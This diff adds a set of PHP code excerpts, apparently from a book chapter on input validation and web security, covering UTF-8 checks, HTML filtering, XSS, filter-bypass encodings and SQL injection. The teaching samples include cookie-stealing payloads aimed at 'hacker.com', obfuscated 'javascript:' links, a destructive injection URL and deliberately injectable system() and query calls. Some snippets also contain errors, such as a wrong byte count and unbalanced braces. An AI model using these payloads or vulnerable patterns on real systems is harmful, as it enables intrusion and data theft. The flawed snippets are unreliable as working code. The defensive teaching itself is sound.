@@ -1,0 +1,576 @@
+chapter: Data Integrity and Security
+==================
+
+[\xC0-\xDF]([^\x80-\xBF]|$)
+[\xE0-\xEF].{0,1}([^\x80-\xBF]|$)
+[\xF0-\xF7].{0,2}([^\x80-\xBF]|$)
+[\xF8-\xFB].{0,3}([^\x80-\xBF]|$)
+[\xFC-\xFD].{0,4}([^\x80-\xBF]|$)
+[\xFE-\xFE].{0,5}([^\x80-\xBF]|$)
+
+    
+    
+====================================
+
+[\x00-\x7F][\x80-\xBF]
+[\xC0-\xDF].[\x80-\xBF]
+[\xE0-\xEF]..[\x80-\xBF]
+[\xF0-\xF7]...[\x80-\xBF]
+[\xF8-\xFB]....[\x80-\xBF]
+[\xFC-\xFD].....[\x80-\xBF]
+[\xFE-\xFE]......[\x80-\xBF]
+
+    
+    
+====================================
+
+^[\x80-\xBF]
+
+    
+    
+====================================
+
+function is_valid_utf8(&$input){
+        $rx = '[\xC0-\xDF]([^\x80-\xBF]|$)';
+        $rx .= '|[\xE0-\xEF].{0,1}([^\x80-\xBF]|$)';
+        $rx .= '|[\xF0-\xF7].{0,2}([^\x80-\xBF]|$)';
+        $rx .= '|[\xF8-\xFB].{0,3}([^\x80-\xBF]|$)';
+        $rx .= '|[\xFC-\xFD].{0,4}([^\x80-\xBF]|$)';
+        $rx .= '|[\xFE-\xFE].{0,5}([^\x80-\xBF]|$)';
+        $rx .= '|[\x00-\x7F][\x80-\xBF]';
+        $rx .= '|[\xC0-\xDF].[\x80-\xBF]';
+        $rx .= '|[\xE0-\xEF]..[\x80-\xBF]';
+        $rx .= '|[\xF0-\xF7]...[\x80-\xBF]';
+        $rx .= '|[\xF8-\xFB]....[\x80-\xBF]';
+        $rx .= '|[\xFC-\xFD].....[\x80-\xBF]';
+        $rx .= '|[\xFE-\xFE]......[\x80-\xBF]';
+        $rx .= '|^[\x80-\xBF]';
+        return preg_match("!$rx!", $input) ? 0 : 1;
+}
+
+    
+    
+====================================
+
+function ensure_input_is_valid_utf8(&$input){
+        if (!is_valid_utf8($input)){
+                $input = utf8_encode($input);
+        }
+}
+
+    
+    
+====================================
+
+[calh@admin1 ~] $ php -q utf8_bench.php
+Trying 1000 loops of 1024 bytes ... done
+RegEx: 0.655966 secs (1524.490 per/sec)
+
+    
+    
+====================================
+
+function is_valid_utf8_iconv(&$str){
+  $out = iconv("UTF-8", "UTF-8", $str);
+  return ($out == $str) ? 1 : 0;
+}
+
+    
+    
+====================================
+
+[calh@admin1 ~] $ php -q utf8_bench_2.php
+Trying 1000 loops of 1024 bytes ... done
+RegEx: 0.655966 secs ( 1524.490 per/sec)
+iconv: 0.028700 secs (34843.068 per/sec)
+
+    
+    
+====================================
+
+function is_valid_utf8_statemachine(&$input){
+        $more = 0;
+        $len = strlen($input);
+        for($i=0; $i<$len; $i++){
+                $c = ord($input{$i});
+                if ($c <= 0x7F){
+                         if ($more > 0){ return 0; }
+                 }elseif ($c <= 0xBF){
+                         if ($more == 0){ return 0; }
+                         $more--;
+                 }elseif ($c <= 0xDF){
+                         if ($more > 0){ return 0; }
+                         $more = 1;
+                 }elseif ($c <= 0xEF){
+                         if ($more > 0){ return 0; }
+                         $more = 2;
+                 }elseif ($c <= 0xF7){
+                         if ($more > 0){ return 0; }
+                         $more = 2;
+                 }elseif ($c <= 0xFB){
+                         if ($more > 0){ return 0; }
+                         $more = 3;
+                 }elseif ($c <= 0xFD){
+                         if ($more > 0){ return 0; }
+                         $more = 4;
+                 }elseif ($c <= 0xFE){
+                         if ($more > 0){ return 0; }
+                         $more = 5;
+                 }else{
+                         if ($more > 0){ return 0; }
+                         $more = 6;
+                 }
+       }
+       return ($more == 0) ? 1 : 0;
+}
+
+    
+    
+====================================
+
+[calh@admin1 ~] $ php -q utf8_bench_3.php
+Trying 1000 loops of 1024 bytes ... done
+RegEx: 0.655966 secs (1524.490 per/sec)
+iconv: 0.028700 secs (34843.068 per/sec)
+State: 2.253097 secs ( 443.834 per/sec)
+
+    
+    
+====================================
+
+$data = preg_replace('!\p{C}!u', '', $data);
+
+    
+    
+====================================
+
+$input = preg_replace('!\r\n?!', '\n', $input);
+
+    
+    
+====================================
+
+<user username="foo bar" />
+
+    
+    
+====================================
+
+<user username="foo
+bar" />
+
+    
+    
+====================================
+
+hello world
+<style>
+body { display: none !important; }
+</style>
+
+    
+    
+====================================
+
+hello world
+<script>
+location.href = 'http://hacker.com/?cookies='+document.cookie;
+</style>
+
+    
+    
+====================================
+
+<b style="display: block; 
+        position: absolute; 
+        top: 0px; 
+        left: 0px; 
+        width: 100%; 
+        height: 100%; 
+        background-color: #ffffff;">
+                hello world</b>
+<b onmouseover="location.href = 'http://hacker.com/?cookies='+
+        document.cookie;">hello world</b>
+
+    
+    
+====================================
+
+$whitelist = array(
+        'a' => array('href', 'target', 'title'),
+        'b' => array(),
+        'img' => array('src', 'width', 'height', 'alt'),
+);
+
+    
+    
+====================================
+
+<b>hello world
+</div></div></div></div>hello world
+
+    
+    
+====================================
+
+bad: <b><i>hello world</b></i>
+good: <b><i>hello world</i></b>
+
+    
+    
+====================================
+
+http://myapp.com/profile.php?id=11
+...
+<p>Take a look at <a href="/photos.php?id=11">Cal's Photos</a>.</p>
+...
+
+    
+    
+====================================
+
+<p>Take a look at <a href="/photos.php?id=<?=$_GET[id]?>"><?=$user[username]?>'s
+Photos</a>.</p>
+<p>Take a look at <a href="/photos.php?id={$smarty.get.id}">{$user.username}'s
+Photos</a>.</p>
+
+    
+    
+====================================
+
+http://myapp.com/profile.php?id="><script>alert('hello');</script><
+
+    
+    
+====================================
+
+<form action="<?=$_SERVER['PHP_SELF']?>">
+
+    
+    
+====================================
+
+http://myapp.com/foo.php/"><script>alert('hello');</script><
+
+    
+    
+====================================
+
+<p>Take a look at <a href="/photos.php?id=<?=HtmlSpecialChars($_GET[id])?>"><?=HtmlSpecialChars($user[username])?>'s
+Photos</a>.</p>
+<p>Take a look at <a href="/photos.php?id={$smarty.get.id|escape}">{$user.username|escape}'s
+Photos</a>.</p>
+
+    
+    
+====================================
+
+<input type="hidden" name="id" value=
+"<?=$_GET[id]?>" />
+
+    
+    
+====================================
+
+function filter_html($input){
+        return preg_replace_callback('!</?([a-z0-9]+)[^<>]*>!i', 'filter_html_tag',
+        $input);
+}
+function filter_html_tag($matches){
+        $allowed = array('a', 'b', 'img');
+        if (in_array(StrToLower($matches[1]), $allowed)){
+                return $matches[0];
+        }
+        return '';
+}
+
+    
+    
+====================================
+
+ <script<script>> 
+ <<script>script<script>> 
+ <scr<!-- foo -->ipt> 
+
+    
+    
+====================================
+
+$data = preg_replace("/>>+/", ">", $data);
+$data = preg_replace("/<<+/", "<", $data);
+$data = preg_replace("/^>/", "", $data);
+$data = preg_replace("/<([^>]*?)(?=<|$)/", "<$1>", $data);
+$data = preg_replace("/(^|>)([^<]*?)(?=>)/", "$1<$2", $data);
+
+    
+    
+====================================
+
+$stack = array();
+...match tags, calling match_start and match_end for each tag...
+function match_start($tag_name){
+        # we're starting a new tag - place it on the stack
+        $stack[] = $tag_name;
+}
+function match_end($tag_name){
+        # we're ending a tag - find it on the stack
+        # we need to return the HTML to replace the end tag with if any
+        $ret = '';
+        while(count($stack)){
+                $tag = array_pop($stack);
+                $ret .= "</$tag>";
+                if ($tag == $tag_name){
+                        return $ret;
+                }
+        }
+        # we removed everything on the stack and
+        # didn't find an opening version of $tag_name
+        # so we'll just discard it
+        return $ret;
+}
+
+    
+    
+====================================
+
+<!-- foo > bar -->
+
+    
+    
+====================================
+
+$data = preg_replace("/<!--(.*?)-->/s", "", $data);
+$data = preg_replace_callback("/<![CDATA[(.*?)]]>/s", 'escape_cdata_section', $data);
+function escape_cdata_section($matches){
+        return HtmlSpecialChars($matches[1]);
+}
+
+    
+    
+====================================
+
+ <a href="javascript:foo"> 
+ <img src="javascript:foo"> 
+
+    
+    
+====================================
+
+ protocol ":" protocol-dependant-address 
+
+    
+    
+====================================
+
+mailto:cal@iamcal.com
+http://iamcal.com/
+ftp://iamcal.com/
+javascript:alert('hello world');
+about:blank
+
+    
+    
+====================================
+
+mailto
+http
+https
+ftp
+
+    
+    
+====================================
+
+<a href="java script:foo">
+<a href="java{\t}script:foo">
+<a href="java{\n}script:foo">
+<a href="java{\0}script:foo">
+<a href=" javascript:foo">
+<a href="JaVaScRiPt:foo">
+
+    
+    
+====================================
+
+<a href="http:foo">
+<a href="http{\n}:foo">
+<a href=" http:foo">
+<a href="http :foo">
+<a href="HTTP:foo">
+
+    
+    
+====================================
+
+<a href="&#106;&#97;&#118;&#97; &#115;&#99;&#114;&#105;&#112;&#116;&#58;foo">
+
+    
+    
+====================================
+
+<a href="&#106&#97&#118&#97 &#115&#99&#114&#105&#112&#116&#58;foo">
+
+    
+    
+====================================
+
+<a href="&#0000106;&#0000097; &#0000118;&#0000097;&#0000115;&#0000099; &#0000114;&#0000105; &#0000112;&#0000116; &#0000058;foo">
+
+    
+    
+====================================
+
+<a href="&#x6A;&#x61;&#x76; &#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A; foo">
+
+    
+    
+====================================
+
+<a href="%6A%61%76%61%73%63%72 %69%70%74%3Afoo">
+
+    
+    
+====================================
+
+# create a temporary file for request data
+$filename = "/tmp/app_data_$_POST[id].tmp";
+system("touch $filename");
+
+    
+    
+====================================
+
+mysql_query("SELECT * FROM Frobs WHERE id=$HTTP_GET_VARS[id]");
+
+    
+    
+====================================
+
+page.php?id=1;DELETE+FROM+Frobs;
+
+    
+    
+====================================
+
+SELECT * FROM Frobs WHERE id=1; DELETE FROM Frobs;
+
+    
+    
+====================================
+
+GRANT SELECT ON *.* TO "foo"@"%" IDENTIFIED BY "bar";
+FLUSH PRIVILEGES;
+
+    
+    
+====================================
+
+GRANT SELECT, INSERT, UPDATE, DELETE ON MyApp.* TO "www-rw"@"10.0.0.%"
+IDENTIFIED BY "password_1";
+GRANT SELECT ON MyApp.* TO "www-r"@"10.0.0.%" IDENTIFIED BY "password_2";
+FLUSH PRIVILEGES;
+
+    
+    
+====================================
+
+DELETE FROM Frobs;
+
+    
+    
+====================================
+
+function db_escape_str($data){
+        return "'".AddSlashes($data)."'";
+}
+ function db_escape_int($data){
+         return intval($data);
+}
+
+    
+    
+====================================
+
+function  db_escape_str_like($string){
+        return str_replace(array('%','_'), array('\\%','\\_'), $string);
+}
+function  db_escape_str_rlike($string){
+        return preg_replace("/([().\[\]*^\$])/", '\\\$1', $string);
+}
+
+    
+    
+====================================
+
+$foo = db_escape_str_like($_POST[widget]);
+$sql = "SELECT * FROM Frobs WHERE widget LIKE '%$foo%'";
+
+    
+    
+====================================
+
+db_insert('table_name', array(
+    'field_1' => db_escape_str($value_1),
+    'field_2' => db_escape_str($value_2),
+    'field_3' => db_escape_int($value_3),
+));
+
+    
+    
+====================================
+
+if ($dbst = mysqli_prepare($dbh, "SELECT id FROM Frobs WHERE frob_type=?")) {
+        mysqli_stmt_bind_param($dbst, "s", $_GET[frob_type]);
+        mysqli_stmt_execute($dbst);
+        mysqli_stmt_store_result($dbst);
+        mysqli_stmt_bind_result($dbst, $id);
+        mysqli_stmt_fetch($dbst);
+        mysqli_stmt_close($dbst);
+        echo "Id was $id!";
+} 
+
+    
+    
+====================================
+
+function db_query_prepare($dbh, $sql, $args){
+  $dbst = mysqli_prepare($dbh, $sql);
+  if (!$dbst){ return 0; }
+  foreach($args as $arg)
+    mysqli_stmt_bind_param($dbst, "s", $arg);
+  }
+  mysqli_stmt_execute($dbst);
+  mysqli_stmt_store_result($dbst);
+  return $dbst;
+}
+function db_fetch_array(&$dbst){
+  $data = mysqli_stmt_result_metadata($dbst);
+  $fields = array();
+  $out = array();
+  $fields[0] = &$dbst;
+  $count = 1;
+  while ($field = mysqli_fetch_field($data)) {
+    $fields[$count] = &$out[$field->name];
+    $count++;
+  }
+  call_user_func_array(mysqli_stmt_bind_result, $fields);
+  mysqli_stmt_fetch($dbst);
+  return $out;
+}
+$result = db_query_prepare($dbh, "SELECT id FROM Frobs WHERE frob_type=?", 
+ array($_GET[frob_type]));
+$row = db_fetch_array($result);
+echo "Id is $row[id]!\n";
+
+    
+    
+====================================
+
+$result = $dbh->prepare("SELECT id FROM Frobs WHERE frob_type=?");
+$result->execute(array($_GET['frob_type']));
+$row = $result->fetch();
+echo "Id is $row[id]!\n";
+
+    
+    
+==================
